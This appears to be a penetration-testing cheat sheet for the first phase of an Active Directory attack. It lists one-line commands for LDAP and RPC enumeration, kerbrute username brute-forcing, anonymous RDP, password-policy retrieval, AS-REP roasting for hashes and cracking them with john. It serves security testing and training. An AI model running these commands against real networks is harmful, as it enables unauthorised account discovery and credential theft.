# Initial Scans

| Info                                                           | Command                                                                                                      |
| -------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------ |
| Scan LDAP with nmap                                            | `nmap -p 389 -sC -sV $ip`                                                                                    |
| LDAP Enumeration                                               | `ldapsearch -v -x -b "DC=domain,DC=local" -H "ldap://$ip"`                                                   |
| Get User account & description field                           | `ldapsearch -v -x -b "DC=domain,DC=local" -H "ldap://$ip" \| grep 'sAMAccountName\|description'`             |
| Get User accounts                                              | `rpcclient -U% $ip; enumdomusers; enumdomains; enumprivs`                                                    |
| Quick Bruteforce scan for valid usernames                      | `kerbrute -users /usr/share/seclists/Usernames/Names/names.txt -domain $domain -dc-ip $ip`                   |
| Extensive Bruteforce scan for valid usernames                  | `kerbrute -users /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -domain $domain -dc-ip $ip` |
| Extensive Bruteforce scan for valid usernames                  | `kerbrute -users /usr/share/wordlists/names.txt -domain DICTIONARY -dc-ip $ip`                               |
| Userless RDP session / See who is logged on / lock screen info | `rdesktop -f -u "" $ip`                                                                                      |
| Get Password Policy                                            | `crackmapexec smb $ip --pass-pol -u '' -p ''`                                                                |
| Get Hashes if anon access allowed                              | `GetNPUsers.py $domain/ -format john -outputfile hash`                                                       |
| List and get TGTs for those users without preauth set          | `GetNPUsers.py brute.csl/ -usersfile users.txt -format john -outputfile hash`                                |
| Crack Hashes                                                   | `john hash --wordlist=/usr/share/wordlists/rockyou.txt`                                                      |
| Get users from IPC$ share                                      | `python3 /usr/share/doc/python3-impacket/examples/lookupsid.py anonymous@$ip \| tee users.txt`               |
